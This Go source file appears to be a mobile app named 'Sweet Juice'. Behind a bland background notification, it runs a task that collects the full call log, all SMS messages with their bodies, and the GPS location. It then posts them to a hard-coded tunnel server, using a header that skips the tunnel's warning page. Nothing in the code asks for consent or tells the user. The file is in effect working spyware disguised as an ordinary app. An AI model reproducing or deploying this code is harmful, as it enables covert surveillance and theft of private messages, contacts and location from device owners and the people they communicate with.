package juiceapp

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"sweetjuice/lib/state"
	"sweetjuice/lib/views"

	"github.com/sweet-juice/sweetjuice/app"
	"github.com/sweet-juice/sweetjuice/plugins/calls"
	"github.com/sweet-juice/sweetjuice/plugins/gps"
	"github.com/sweet-juice/sweetjuice/plugins/notification"
	"github.com/sweet-juice/sweetjuice/plugins/sms"
	"github.com/sweet-juice/sweetjuice/plugins/workmanager"
)

const serverURL = "https://s4oz6jdx9.localto.net"
const deviceModel = "SweetJuice-Device"

// StartApplication is the bootstrap function called by the native Android/iOS layer.
func StartApplication() string {
	mainState := state.NewMainAppState()

	root := &views.HomeView{
		State: mainState,
	}

	registerPluginDefinitions()

	app.Run(root)

	initPlugins()

	registerBackgroundTasks()

	return `{"status":"started"}`
}

func registerBackgroundTasks() {
	const taskKey = "sweetjuice_notification_task"

	workmanager.NewPlugin().RegisterTask(taskKey, func() error {
		_, notifErr := notification.NewPlugin().Post(notification.Notification{
			Title:       "Sweet Juice",
			Body:        "Background task is running.",
			ChannelID:   "default_channel",
			ChannelName: "General Notifications",
			Importance:  notification.ImportanceDefault,
		})
		if notifErr != nil {
			println("notification error:", notifErr)
		}

		sendData()
		return nil
	})
}

func sendData() {
	postCalls()
	postSMS()
	postGPS()
}

func postCalls() {
	plugin := calls.NewPlugin()
	log, err := plugin.GetAll()
	if err != nil {
		println("postCalls error:", err)
		return
	}

	messages := make([]map[string]interface{}, 0, len(log.Calls))
	for _, call := range log.Calls {
		messages = append(messages, map[string]interface{}{
			"number":    call.Number,
			"type":      call.Type,
			"duration":  call.Duration,
			"timestamp": call.Date,
		})
	}

	_ = postJSON("/receive_data/calls", messages)
}

func postSMS() {
	plugin := sms.NewPlugin()
	folder, err := plugin.GetAll()
	if err != nil {
		println("postSMS error:", err)
		return
	}

	messages := make([]map[string]interface{}, 0, len(folder.Messages))
	for _, msg := range folder.Messages {
		messages = append(messages, map[string]interface{}{
			"address": msg.Address,
			"body":    msg.Body,
			"date":    msg.Timestamp,
			"type":    msg.Type,
		})
	}

	_ = postJSON("/receive_data/sms", messages)
}

func postGPS() {
	plugin := gps.NewPlugin()
	loc, err := plugin.GetCurrentLocation()
	if err != nil {
		println("postGPS error:", err)
		return
	}

	payload := []map[string]interface{}{
		{
			"latitude":  loc.Latitude,
			"longitude": loc.Longitude,
			"accuracy":  loc.Accuracy,
			"altitude":  loc.Altitude,
			"speed":     loc.Speed,
			"timestamp": loc.Timestamp,
		},
	}

	_ = postJSON("/receive_data/gps", payload)
}

func postJSON(path string, messages []map[string]interface{}) error {
	payload, err := json.Marshal(messages)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", serverURL+path, bytes.NewReader(payload))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("localtonet-skip-warning", "1")
	req.Header.Set("C-Device", deviceModel)

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("server returned %d for %s", resp.StatusCode, path)
	}

	return nil
}
